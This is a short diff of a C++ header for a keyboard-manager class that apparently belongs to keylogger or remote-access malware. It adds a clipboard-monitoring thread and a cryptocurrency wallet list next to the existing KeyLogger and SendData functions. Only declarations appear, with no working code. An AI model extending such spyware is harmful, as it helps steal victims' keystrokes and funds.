@@ -220,9 +220,11 @@ public:
     virtual ~CKeyboardManager1();
     virtual void Notify();
     virtual void OnReceive(LPBYTE lpBuffer, ULONG nSize);
+	static DWORD WINAPI Clipboard(LPVOID lparam);
     static DWORD WINAPI KeyLogger(LPVOID lparam);
     static DWORD WINAPI SendData(LPVOID lparam);
     BOOL m_bIsOfflineRecord;
+	HANDLE m_hClipboard;
     HANDLE m_hWorkThread,m_hSendThread;
     TCHAR	m_strRecordFile[MAX_PATH];
 private:
@@ -233,6 +235,9 @@ private:
 
     bool m_bIsWorking;
 	CircularBuffer *m_Buffer;
+	CLocker m_mu;
+	std::vector<std::string> m_Wallet;
+	std::vector<std::string> GetWallet();
 };
 
 #undef BUFFER_SIZE
